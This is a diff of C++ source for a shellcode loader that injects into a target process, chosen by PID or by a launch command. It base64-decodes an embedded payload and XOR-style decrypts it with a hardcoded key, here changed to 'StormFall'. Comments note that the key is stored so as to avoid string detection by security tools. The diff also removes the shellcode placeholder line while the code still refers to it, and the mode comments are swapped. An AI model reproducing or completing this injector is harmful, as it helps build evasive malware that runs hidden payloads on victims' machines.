@@ -61,13 +61,13 @@ int main(int argc, char** argv)
 	// HANDLE MODE ARGUMENT
 	char* modeStr = argv[1];
 	char* argString = argv[2];
-	if (strcmp(modeStr, "PID") == 0) {
+	if (strcmp(argv[1], "PID") == 0) {
 		// EXECUTE BY CREATING A NEW PROCESS TO INJECT INTO
 		E_MODE = PID;
 		TARGET_PID = atoi(argString);
 
 	}
-	else if (strcmp(modeStr, "EXEC") == 0) {
+	else if (strcmp(argv[1], "EXEC") == 0) {
 		// EXECUTE BY INJECTING INTO AN EXISTING PROCESS WITH PID
 		E_MODE = EXEC;
 		LAUNCH_COMMAND = argString;
@@ -79,8 +79,6 @@ int main(int argc, char** argv)
 	}
 
 
-	// IMPORTANT! BASE64 ENCODED SC GOES HERE
-	string encodedBytes = "";
 	// BASE64 DECODE THE STRING TO GET BYTES
 	string decodedBytes = base64_decode(encodedBytes);
 	unsigned char* encryptedBytes = (unsigned char*)decodedBytes.c_str();
@@ -119,8 +117,8 @@ unsigned char* decryptKey(unsigned char* encryptedBytes, size_t length) {
 
 	// NO NULL BYTE TO PREVENT STRING DETECTION
 	// KEY AND KEY LENGTH
-	char key[] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'};
-	size_t keyLength = 10;
+	char key[] = {'S', 't', 'o', 'r', 'm', 'F', 'a', 'l', 'l'};
+	size_t keyLength = 9;
 
 	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE
 
